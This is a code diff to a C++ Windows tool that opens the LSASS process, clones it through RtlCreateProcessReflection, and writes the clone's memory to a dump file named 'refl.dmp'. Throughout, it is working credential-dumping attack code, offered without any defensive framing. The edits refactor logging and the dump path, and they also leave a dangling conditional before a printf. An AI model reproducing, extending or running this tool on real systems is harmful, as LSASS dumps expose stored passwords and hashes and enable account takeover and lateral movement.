@@ -14,6 +14,7 @@
 
 #pragma comment (lib, "Dbghelp.lib")
 #pragma comment (lib, "Advapi32.lib")
+#pragma comment (lib, "ntdll.lib")
 
 #define USE_RTL_PROCESS_REFLECTION
 
@@ -64,7 +65,7 @@ NTSTATUS(NTAPI* _RtlCreateProcessReflection) (
 bool load_RtlCreateProcessReflection()
 {
     if (_RtlCreateProcessReflection == NULL) {
-        HMODULE lib = LoadLibraryA("ntdll.dll");
+        HMODULE lib = GetModuleHandleA("ntdll.dll");
         if (!lib) return false;
 
         FARPROC proc = GetProcAddress(lib, "RtlCreateProcessReflection");
@@ -91,25 +92,32 @@ typedef struct {
     bool is_ok;
 } t_refl_args;
 
-DWORD WINAPI refl_creator(LPVOID lpParam)
+BOOL WINAPI refl_creator(t_refl_args *args)
 {
-    t_refl_args* args = static_cast<t_refl_args*>(lpParam);
-    if (!args) {
-        return !S_OK;
-    }
-    args->is_ok = false;
+    NTSTATUS ret = S_OK;
 
-    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
-    NTSTATUS ret = _RtlCreateProcessReflection(args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
-    if (ret == S_OK) {
-        args->is_ok = true;
-        args->returned_hndl = info.ReflectionProcessHandle;
-        args->returned_pid = (DWORD)info.ReflectionClientId.UniqueProcess;
+    if (args != NULL)
+    {
+        T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
+        ret = _RtlCreateProcessReflection(args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
+        if (ret == S_OK)
+        {
+            args->is_ok = true;
+            args->returned_hndl = info.ReflectionProcessHandle;
+            args->returned_pid = (DWORD)info.ReflectionClientId.UniqueProcess;
+            DPRINT("RtlCreteProcessReflection: new PID: %d", (DWORD)info.ReflectionClientId.UniqueProcess);
+        }
+        else
+        {
+            args->is_ok = false;
+            DPRINT("error: %d\n", GetLastError());
+        }
     }
-    else {
-        printf("error: %d\n", GetLastError());
+    else
+    {
+        ret = S_FALSE;
     }
-    return ret;
+    return (ret == S_OK);
 }
 
 static BOOL check_vad_permission(PMEMORY_BASIC_INFORMATION mbi)
@@ -155,8 +163,8 @@ PVOID get_peb_address(
         NULL);
     if (!NT_SUCCESS(status))
     {
-        printf("NtQueryInformationProcess %d\n", status);
-        printf("Could not get the PEB of the process\n");
+        DPRINT("NtQueryInformationProcess %d\n", status);
+        DPRINT("Could not get the PEB of the process\n");
         return 0;
     }
 
@@ -192,24 +200,20 @@ int main() {
     //lsassPID = GetCurrentProcessId();
 
     lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-    printf("Target PID: %d\n", lsassPID);
-
-    HANDLE outFile = CreateFile(L"refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    printf("Using file: refl.dmp\n");
+    DPRINT("Target PID: %d\n", lsassPID);
 
     load_RtlCreateProcessReflection();
     t_refl_args args = { 0 };
     args.orig_hndl = lsassHandle;
     DWORD ret = refl_creator(&args);
 
-    printf("Clone PID: %d\n", args.returned_pid);
+    if (args.returned_hndl == 0)
 
-    /***
-    * Generate a manual dump of memory
-    **/
+    printf("Clone PID: %d\n", args.returned_pid);
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, args.returned_pid);
 
+#ifdef _DEBUG
     if (hProcess != NULL)
     {
         ULONG_PTR ptr = 0;
@@ -221,31 +225,41 @@ int main() {
             VirtualQueryEx(hProcess, (LPVOID)ptr, &mbi, sizeof(mbi));
             if (check_vad_permission(&mbi))
             {
-                printf("[%p] Buffer %p size %p\n", mbi.Type, mbi.BaseAddress, mbi.RegionSize);
-                if (mbi.RegionSize == 0x1000)
-                {
-                    //DebugBreak();
-                }
+                DPRINT("[%p] Buffer %p size %p\n", mbi.Type, mbi.BaseAddress, mbi.RegionSize);
             }
             ptr = (ULONG_PTR) mbi.BaseAddress + mbi.RegionSize;
         } while (ptr < (0x00007fffffff0000));
     }
-    //     DWORD retd = MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+#endif
 
+#ifdef _USE_DBGHELP
+    HANDLE outFile = CreateFile(L"refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    DWORD retd = MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+    CloseHandle(outFile);
+#else
     dump_context dc = {};
     dc.hProcess = hProcess;
-    dc.DumpMaxSize = 0x10000000;
+    dc.DumpMaxSize = 0x4000000;
 
-    dc.BaseAddress = malloc(dc.DumpMaxSize);
+    dc.BaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dc.DumpMaxSize);
 
-    NanoDumpWriteDump(&dc);
+    if (NanoDumpWriteDump(&dc))
+    {
+        HANDLE outFile = CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        DPRINT("Using file: refl.dmp\n");
 
-    printf("Generated output %p size %p\n", dc.BaseAddress, dc.DumpMaxSize);
-    WriteFile(outFile, dc.BaseAddress, dc.rva, NULL, NULL);
+        DPRINT("Generated output %p size %p\n", dc.BaseAddress, (PVOID)dc.DumpMaxSize);
+        WriteFile(outFile, dc.BaseAddress, dc.rva, NULL, NULL);
 
-    CloseHandle(outFile);
-    TerminateProcess(args.returned_hndl, 0);
-    CloseHandle(args.returned_hndl);
+        CloseHandle(outFile);
+    }
+#endif
 
+    if (args.returned_hndl != NULL)
+    {
+        TerminateProcess(args.returned_hndl, 0);
+        CloseHandle(args.returned_hndl);
+    }
     return 0;
 }
